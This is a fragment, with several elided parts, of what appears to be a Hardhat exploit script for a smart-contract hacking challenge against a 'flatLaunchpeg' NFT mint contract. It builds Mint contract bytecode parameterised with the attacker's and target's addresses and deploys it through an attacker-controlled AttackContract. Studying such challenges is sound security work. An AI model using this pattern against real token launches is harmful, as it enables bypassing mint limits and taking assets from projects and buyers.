...
/*************************************************88 */
    ...
    //--------------Get bytecode-------------------
    const artifact = await artifacts.readArtifact("Mint");
    const MintContractBytecode = artifact.bytecode;
   // console.log("Mint Contract bytecode", MintContractBytecode )
      ...
      // Define the types and values to encode
        ...
        const values = [attacker.address, flatLaunchpeg.address];
      ...
      const bytecode = MintContractBytecode + TestContractParameter;
      console.log("new byte code", bytecode)

  const AttackContract = await ethers.getContractFactory("AttackContract");
  const attackContract = await AttackContract.connect(attacker).deploy(bytecode);
